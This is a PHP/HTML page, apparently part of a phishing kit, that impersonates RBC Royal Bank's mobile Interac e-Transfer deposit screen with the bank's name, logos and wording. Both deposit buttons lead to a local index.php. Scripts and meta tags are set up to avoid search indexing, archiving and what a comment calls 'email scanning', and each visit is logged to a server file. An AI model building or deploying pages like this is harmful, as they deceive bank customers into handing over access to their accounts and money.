<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT");
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self';");
header("X-XSS-Protection: 1; mode=block");
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en" class=""><head>
    <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../Database/third-party-log.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script><!-- Head content here -->
    
    <!-- Head content here -->
    

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.65, minimum-scale=0.50, maximum-scale=0.80">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>RBC Royal Bank Mobile</title>  

    <link type="text/css" rel="stylesheet" href="./files/mobile-phone-ip-an.css">
    

    
</head>

<body class="ui-mobile-viewport ui-overlay-c">

    <div id="home" tabindex="0" style="min-height: 1326px;">
        <!-- Mobile Header Start -->
        <div id="">
            <span id="logo"><img src="./files/logo-en.png" height="60" alt="RBC Logo"></span>
        </div>
        <div id="mobile-sub-header">
            <span id="sub-logo"><img src="./files/int-en.png" height="47" alt="Interac e-Transfer Logo"></span>
        </div>
        <!-- Mobile Header End -->

        <div id="mobile-content">
            <div id="mobile-content-text">How would you like to deposit your Interac e-Transfer?</div>
        </div>

        <a href="index.php" id="download-link" class="ui-link">
            <div id="mobile-app-btn">
                <p class="btn-text">RBC Mobile</p>
            </div>
        </a>

        <a href="index.php" id="nothanks-link" class="ui-link">
            <div id="online-banking-btn">
                <p class="btn-text">RBC Online Banking</p>
            </div>
        </a>

        <div id="app-store-wrapper">
            <div id="app-store-text">If you don’t have the latest version of the RBC Mobile App, you can download it here:</div>
            <div id="app-store-logo">
                <span id="app-store-img">
          <a href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8" class="ui-link">
            <img src="./files/ios-app-str.png" height="46" alt="App Store Logo and Link to download RBC Mobile App.">
          </a>
        </span>
            </div>
        </div>

        <div id="footer-wrapper">
            
            
            
            
        </div>
    </div>


</body></html>

